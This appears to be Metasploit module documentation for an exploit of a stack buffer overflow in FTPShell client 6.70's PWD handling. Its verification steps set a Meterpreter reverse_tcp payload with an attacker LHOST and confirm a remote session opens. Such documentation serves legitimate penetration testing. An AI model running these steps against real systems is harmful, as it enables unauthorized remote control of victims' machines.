## Vulnerable Application

FTPShell client 6.70 (Enterprise edition) is affected by a stack-based buffer overflow vulnerability which can be leveraged by an attacker to execute arbitrary code on the target. The vulnerability is caused by improper bounds checking of the PWD command. This module has been tested successfully on Windows 7 SP1. The vulnerable application is available for download at [ftpshell.com](http://www.ftpshell.com/downloadclient.htm).

## Verification Steps
    1. Install a vulnerable FTPShell client 6.70
    2. Start `msfconsole`
    3. Do `use exploit/windows/ftp/ftpshell_cli_bof`
    4. Do `set PAYLOAD windows/meterpreter/reverse_tcp`
    5. Do `set LHOST ip`
    6. Do `exploit`
    7. Conect to the FTP server using FTPShell client 6.70
    8. Verify the Meterpreter session is opened
